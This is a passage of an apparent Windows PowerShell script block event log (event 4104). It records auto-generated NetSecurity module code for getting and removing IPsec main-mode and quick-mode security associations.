    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('Query (cdxml)') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('Query (cdxml)', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Exemptions')) {
            [object]$__cmdletization_value = ${Exemptions}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Exemptions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.TrafficExemption'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Exemptions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.TrafficExemption'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('EnableStatefulFtp')) {
            [object]$__cmdletization_value = ${EnableStatefulFtp}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableStatefulFtp'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableStatefulFtp'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('EnableStatefulPptp')) {
            [object]$__cmdletization_value = ${EnableStatefulPptp}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableStatefulPptp'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableStatefulPptp'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteMachineTransportAuthorizationList')) {
            [object]$__cmdletization_value = ${RemoteMachineTransportAuthorizationList}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteMachineTransportAuthorizationList'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteMachineTransportAuthorizationList'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteMachineTunnelAuthorizationList')) {
            [object]$__cmdletization_value = ${RemoteMachineTunnelAuthorizationList}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteMachineTunnelAuthorizationList'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteMachineTunnelAuthorizationList'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteUserTransportAuthorizationList')) {
            [object]$__cmdletization_value = ${RemoteUserTransportAuthorizationList}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteUserTransportAuthorizationList'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteUserTransportAuthorizationList'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteUserTunnelAuthorizationList')) {
            [object]$__cmdletization_value = ${RemoteUserTunnelAuthorizationList}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteUserTunnelAuthorizationList'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RemoteUserTunnelAuthorizationList'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RequireFullAuthSupport')) {
            [object]$__cmdletization_value = ${RequireFullAuthSupport}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RequireFullAuthSupport'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RequireFullAuthSupport'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTyp

ScriptBlock ID: fdf4a81f-7a34-48ac-8245-01028a1b5edb
Path: "
"07-08-2025 18:31:35","4104","Warning","Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetQuickModeSA'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-NetIPsecQuickModeSA
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetQuickModeSA')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeSA', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeSA')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeSA},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeSA')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeSA')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeSA')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeSA') -and (@('ByAssociatedNetIPsecMainModeSA') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeSA}, 'MSFT_NetSAAssociation', 'Antecedent', 'Dependent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecQuickModeSA.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetIPsecQuickModeSA' -Alias '*'
        

function Remove-NetIPsecQuickModeSA
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetQuickModeSA')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeSA', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeSA')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeSA},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetQuickModeSA')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeSA')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeSA')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeSA')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeSA')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeSA') -and (@('ByAssociatedNetIPsecMainModeSA') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeSA}, 'MSFT_NetSAAssociation', 'Antecedent', 'Dependent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByAssociatedNetIPsecMainModeSA', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecQuickModeSA.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-NetIPsecQuickModeSA' -Alias '*'
        


ScriptBlock ID: 544f58e8-e236-4ec5-b60d-bb2913bae7a7
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (1 of 1):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetMainModeSA'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function Get-NetIPsecMainModeSA
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeSA')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeSA', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetQuickModeSA')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecQuickModeSA},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeSA')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeSA')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeSA')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecQuickModeSA') -and (@('ByAssociatedNetIPsecQuickModeSA') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecQuickModeSA}, 'MSFT_NetSAAssociation', 'Dependent', 'Antecedent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeSA.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetIPsecMainModeSA' -Alias '*'
        

function Remove-NetIPsecMainModeSA
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeSA')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeSA', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetQuickModeSA')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecQuickModeSA},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetMainModeSA')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeSA')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeSA')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeSA')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecQuickModeSA')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecQuickModeSA') -and (@('ByAssociatedNetIPsecQuickModeSA') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecQuickModeSA}, 'MSFT_NetSAAssociation', 'Dependent', 'Antecedent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByAssociatedNetIPsecQuickModeSA', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
